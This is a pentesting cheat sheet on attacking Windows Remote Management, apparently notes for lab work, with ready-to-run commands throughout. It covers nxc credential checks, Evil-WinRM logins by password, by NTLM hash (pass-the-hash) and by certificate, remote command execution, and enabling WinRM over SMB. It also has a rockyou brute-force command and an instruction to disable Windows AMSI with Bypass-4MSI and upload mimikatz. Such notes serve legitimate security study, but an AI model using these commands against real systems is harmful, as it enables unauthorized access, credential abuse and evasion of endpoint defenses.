# WinRM (Windows Remote Management)
**Default Ports:** 
* **5985:** HTTP (Standard/Unencrypted)
- **5986:** HTTPS (Encrypted)

**Key Insight:** WinRM is the "SSH for Windows." It is generally stable, firewall-friendly, and perfect for PowerShell execution. Access requires membership in `Remote Management Users` or `Administrators`.
## 1. Discovery & Verification
**Goal:** Confirm the service is active and accessible.
### Nmap
```shell
# Version Scan
# ⚠️ OPSEC: Low Noise.
nmap -p 5985,5986 -sV -sC 10.129.20.13
```
### NetExec (Authentication Check)
**Tool:** `nxc` (formerly CrackMapExec) 
**Description:** Quickly verifies if credentials work without dropping into a full shell. 
**Syntax:** `nxc winrm <IP> -u <User> -p <Pass>`
```shell
# Check Creds (Look for "Pwn3d!" in output)
nxc winrm 10.129.20.13 -u Administrator -p 'Password123!'
```
### Powershell
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
## 2. Interactive Shell 
### Windows Native
```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

# Enter the session
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```
### Evil-WinRM
**Tool:** `evil-winrm` (The King of WinRM tools) 
**Description:** Provides a fully interactive PowerShell shell with built-in file transfer and AMSI bypass. 
**Install:** `gem install evil-winrm`
#### Basic Connection
```shell
# Password Login
evil-winrm -i 10.129.20.13 -u Administrator -p 'Password123!'

# Pass-The-Hash (PtH)
# -H: NTLM Hash
evil-winrm -i 10.129.20.13 -u Administrator -H 300FF5E89EF33F83A8146C10F5AB9BB9
```
#### Certificate Login
```shell
# Used if you extracted a PFX/PEM cert from the machine
evil-winrm -i 10.129.20.13 -c cert.pem -k priv.key -S
```
#### Essential Evil-WinRM Commands
_Once inside the shell, use these built-in commands:_

| **Command**                 | **Description**                                                      |
| --------------------------- | -------------------------------------------------------------------- |
| `menu`                      | Shows available modules (DllLoader, Donut, etc.).                    |
| `Bypass-4MSI`               | **CRITICAL:** Disables Windows Defender AMSI. Run this immediately.  |
| `upload <Local> <Remote>`   | Uploads a file (e.g., `upload /root/mimikatz.exe c:\temp\mimi.exe`). |
| `download <Remote> <Local>` | Downloads a file (e.g., `download c:\users\admin\desktop\flag.txt`). |
| `services`                  | List running services without standard PowerShell cmdlets.           |
## 3. Remote Execution (Non-Interactive)
**Goal:** Execute a single command or enable WinRM if it is disabled.
### NetExec (Command Exec)
```shell
# Execute "whoami"
nxc winrm 10.129.20.13 -u user -p pass -x "whoami"
```
### Enabling WinRM via SMB
**Scenario:** You have Admin creds, but Port 5985 is closed. You can use SMB (Port 445) to enable WinRM.
```shell
# Uses PsExec logic to configure the service
nxc smb 10.129.20.13 -u Administrator -p 'Password123!' -M winrm_enable
```
## 4. Brute Force
**Tool:** NetExec / CrackMapExec 
**Context:** WinRM is faster than SMB for brute-forcing but can be logged more aggressively.
```shell
# Brute force user against a password list
nxc winrm 10.129.20.13 -u Administrator -p /usr/share/wordlists/rockyou.txt
```